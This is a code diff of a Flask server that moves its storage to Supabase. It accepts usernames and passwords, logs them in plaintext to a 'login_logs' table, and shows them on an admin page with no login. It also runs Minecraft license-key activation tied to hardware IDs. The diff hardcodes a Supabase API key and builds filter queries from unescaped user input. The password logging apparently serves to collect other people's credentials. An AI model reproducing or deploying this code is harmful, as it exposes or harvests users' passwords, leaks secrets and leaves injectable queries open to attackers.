@@ -1,11 +1,15 @@
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for
-import json, os
 from datetime import datetime
+import requests
 
 app = Flask(__name__)
-DB = 'used_users.json'
-LICENSE_DB = 'licenses.json'
-USED_KEYS_DB = 'used_keys.json'
+
+SUPABASE_URL = "https://ldhdtghrvijamxhukcxu.supabase.co"
+SUPABASE_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkaGR0Z2hydmlqYW14aHVrY3h1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwNzMzNTQsImV4cCI6MjA2NjY0OTM1NH0.zpJsvWxQ1PAnikU53Yzu2DZutvCJgIqdPYM6TqukA-g"
+HEADERS = {
+    "apikey": SUPABASE_API_KEY,
+    "Authorization": f"Bearer {SUPABASE_API_KEY}"
+}
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -42,11 +46,11 @@ HTML_TEMPLATE = '''
                 {% for r in records %}
                 <tr>
                     <td>{{ loop.index }}</td>
-                    <td>{{ r.user }}</td>
+                    <td>{{ r.username }}</td>
                     <td>{{ r.password }}</td>
                     <td>{{ r.time }}</td>
                     <td>
-                        <form method="POST" action="/delete/{{ loop.index0 }}">
+                        <form method="POST" action="/delete/{{ r.id }}">
                             <button type="submit">Delete</button>
                         </form>
                     </td>
@@ -71,54 +75,27 @@ def submit():
     if not isinstance(data, dict) or "user" not in data or "password" not in data:
         return jsonify({"status": "error", "message": "invalid payload"}), 400
 
-    records = []
-    if os.path.exists(DB):
-        with open(DB, 'r') as f:
-            try:
-                records = json.load(f)
-            except json.JSONDecodeError:
-                records = []
-
-    data["time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    records.append(data)
-    with open(DB, 'w') as f:
-        json.dump(records, f, indent=2)
-
+    payload = {
+        "username": data["user"],
+        "password": data["password"],
+        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    }
+    r = requests.post(f"{SUPABASE_URL}/rest/v1/login_logs", headers={**HEADERS, "Content-Type": "application/json"}, json=payload)
     return jsonify({"status": "ok"})
 
 @app.route("/admin", methods=["GET"])
 def admin_panel():
-    records = []
-    if os.path.exists(DB):
-        with open(DB, 'r') as f:
-            try:
-                records = json.load(f)
-            except json.JSONDecodeError:
-                records = []
-    return render_template_string(HTML_TEMPLATE, records=records)
+    r = requests.get(f"{SUPABASE_URL}/rest/v1/login_logs?select=*", headers=HEADERS)
+    return render_template_string(HTML_TEMPLATE, records=r.json())
 
-@app.route("/delete/<int:index>", methods=["POST"])
-def delete_entry(index):
-    if os.path.exists(DB):
-        with open(DB, 'r') as f:
-            try:
-                records = json.load(f)
-            except json.JSONDecodeError:
-                records = []
-
-        if 0 <= index < len(records):
-            records.pop(index)
-            with open(DB, 'w') as f:
-                json.dump(records, f, indent=2)
-
+@app.route("/delete/<int:log_id>", methods=["POST"])
+def delete_entry(log_id):
+    r = requests.delete(f"{SUPABASE_URL}/rest/v1/login_logs?id=eq.{log_id}", headers=HEADERS)
     return redirect(url_for('admin_panel'))
 
 @app.route("/activate-key", methods=["POST"])
 def activate_key():
     data = request.json
-    if not isinstance(data, dict):
-        return "Invalid data format", 400
-
     key = data.get("key")
     hwid = data.get("hwid")
     mcuser = data.get("mcuser")
@@ -126,82 +103,45 @@ def activate_key():
     if not key or not hwid or not mcuser:
         return "Missing required fields", 400
 
-    licenses = {}
-    used_keys = {}
-
-    if os.path.exists(LICENSE_DB):
-        with open(LICENSE_DB, 'r') as f:
-            try:
-                licenses = json.load(f)
-            except json.JSONDecodeError:
-                licenses = {}
-
-    if os.path.exists(USED_KEYS_DB):
-        with open(USED_KEYS_DB, 'r') as f:
-            try:
-                used_keys = json.load(f)
-            except json.JSONDecodeError:
-                used_keys = {}
-
-    if key in used_keys:
-        entry = used_keys[key]
-        if entry.get("hwid") == hwid and entry.get("used_by") == mcuser:
+    check_used = requests.get(f"{SUPABASE_URL}/rest/v1/used_keys?key=eq.{key}", headers=HEADERS)
+    if check_used.json():
+        entry = check_used.json()[0]
+        if entry["hwid"] == hwid and entry["used_by"] == mcuser:
             return jsonify({"status": "ok"})
-        return jsonify({
-            "status": "error",
-            "message": "Key đã được sử dụng bởi thiết bị khác.",
-            **entry
-        }), 403
+        return jsonify({"status": "error", "message": "Key đã được sử dụng bởi thiết bị khác.", **entry}), 403
 
-    if key not in licenses:
+    check_license = requests.get(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
+    if not check_license.json():
         return jsonify({"status": "invalid", "message": "Key không tồn tại trong danh sách cấp phép."}), 403
 
-    used_keys[key] = {
+    requests.delete(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
+    used_data = {
+        "key": key,
         "used_by": mcuser,
         "hwid": hwid,
         "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
-    licenses.pop(key, None)
-
-    with open(LICENSE_DB, 'w') as f:
-        json.dump(licenses, f, indent=2)
-    with open(USED_KEYS_DB, 'w') as f:
-        json.dump(used_keys, f, indent=2)
-
+    requests.post(f"{SUPABASE_URL}/rest/v1/used_keys", headers={**HEADERS, "Content-Type": "application/json"}, json=used_data)
     return jsonify({"status": "ok"})
 
 @app.route("/check-key", methods=["POST"])
 def check_key():
     data = request.json
     key = data.get("key")
-
     if not key:
         return jsonify({"status": "error", "message": "Thiếu key."}), 400
 
-    licenses = {}
-    used_keys = {}
-
-    if os.path.exists(LICENSE_DB):
-        with open(LICENSE_DB, 'r') as f:
-            try:
-                licenses = json.load(f)
-            except json.JSONDecodeError:
-                licenses = {}
-
-    if os.path.exists(USED_KEYS_DB):
-        with open(USED_KEYS_DB, 'r') as f:
-            try:
-                used_keys = json.load(f)
-            except json.JSONDecodeError:
-                used_keys = {}
-
-    if key in licenses:
+    check_license = requests.get(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
+    if check_license.json():
         return jsonify({"status": "available", "message": "Key hợp lệ và chưa được sử dụng."})
-    elif key in used_keys:
-        return jsonify({"status": "used", **used_keys[key]})
-    else:
-        return jsonify({"status": "invalid", "message": "Key không tồn tại."}), 404
+
+    check_used = requests.get(f"{SUPABASE_URL}/rest/v1/used_keys?key=eq.{key}", headers=HEADERS)
+    if check_used.json():
+        return jsonify({"status": "used", **check_used.json()[0]})
+
+    return jsonify({"status": "invalid", "message": "Key không tồn tại."}), 404
 
 if __name__ == "__main__":
+    import os
     port = int(os.environ.get("PORT", 8000))
     app.run(host="0.0.0.0", port=port)
